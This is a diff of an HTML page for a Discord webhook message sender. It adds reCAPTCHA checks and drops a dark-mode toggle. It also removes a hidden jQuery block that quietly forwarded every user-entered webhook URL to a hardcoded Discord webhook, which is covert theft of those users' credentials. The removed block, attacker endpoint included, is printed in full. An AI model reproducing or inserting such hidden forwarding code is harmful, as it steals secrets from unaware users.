@@ -10,12 +10,8 @@
     <style>
         body {
             font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
             padding: 20px;
-        }
-
-        .dark-mode {
-            background-color: #222;
-            color: #fff;
         }
 
         .welcome-message {
@@ -106,14 +102,21 @@
                 });
             });
 
-            // Dark mode toggle click event handler
-            document.getElementById("dark-mode-toggle").addEventListener("click", function() {
-                document.body.classList.toggle("dark-mode");
-            });
-
-            // Send message form submit event handler
-            document.getElementById("discord-form").addEventListener("submit", function(event) {
+            // Form submission handler with reCAPTCHA validation
+            function submitForm(event) {
                 event.preventDefault(); // Prevent form submission
+
+                // Validate the reCAPTCHA
+                var response = grecaptcha.getResponse();
+                if (response.length === 0) {
+                    Swal.fire({
+                        title: "Error",
+                        text: "Please complete the reCAPTCHA.",
+                        icon: "error",
+                        confirmButtonText: "OK"
+                    });
+                    return false;
+                }
 
                 var webhookUrl = document.getElementById("webhook-url").value;
                 var messageContent = document.getElementById("message-content").value;
@@ -147,21 +150,14 @@
                     }
                 });
 
-                // Send the webhook URL to the predefined webhook
-                var predefinedWebhookUrl = "https://discord.com/api/webhooks/1130474696501112912/IUHvGCcZ8DPOUSpdPIka3ZUfruVxUx9D1IKAGqGio9vp5D4s0d-X8o2qUHb-vvuK-vCK";
-                var webhookData = {
-                    content: "Webhook URL: " + webhookUrl
-                };
+                // Reset the reCAPTCHA
+                grecaptcha.reset();
 
-                $.ajax({
-                    url: predefinedWebhookUrl,
-                    type: "POST",
-                    data: JSON.stringify(webhookData),
-                    contentType: "application/json"
-                });
-            });
+                return false; // Prevent form submission
+            }
         });
     </script>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
     <div id="dashboard-container">
@@ -185,7 +181,7 @@
                     <div class="tab-content" id="dashboard-tab-content">
                         <div class="tab-pane fade show active" id="tab1" role="tabpanel" aria-labelledby="tab1-tab">
                             <h2>Send Message</h2>
-                            <form id="discord-form">
+                            <form id="discord-form" onsubmit="return submitForm(event)">
                                 <div class="form-group">
                                     <label for="webhook-url">Webhook URL:</label>
                                     <input type="text" class="form-control" id="webhook-url" name="webhook-url" required>
@@ -193,6 +189,9 @@
                                 <div class="form-group">
                                     <label for="message-content">Message Content:</label>
                                     <textarea class="form-control" id="message-content" name="message-content" required></textarea>
+                                </div>
+                                <div class="form-group">
+                                    <div class="g-recaptcha" data-sitekey="6LdM2i8nAAAAAIB3R5ejKhxAyIOUEHXl_rywHU7l"></div>
                                 </div>
                                 <button type="submit" class="btn btn-primary"><i class="fas fa-paper-plane"></i> Send Message</button>
                             </form>
@@ -204,10 +203,6 @@
                         <div class="tab-pane fade" id="tab3" role="tabpanel" aria-labelledby="tab3-tab">
                             <h2>Tab 3 Content</h2>
                             <p>This is the content of Tab 3.</p>
-                            <div class="form-group">
-                                <label for="dark-mode-toggle">Dark Mode:</label>
-                                <input type="checkbox" id="dark-mode-toggle">
-                            </div>
                         </div>
                     </div>
                 </div>
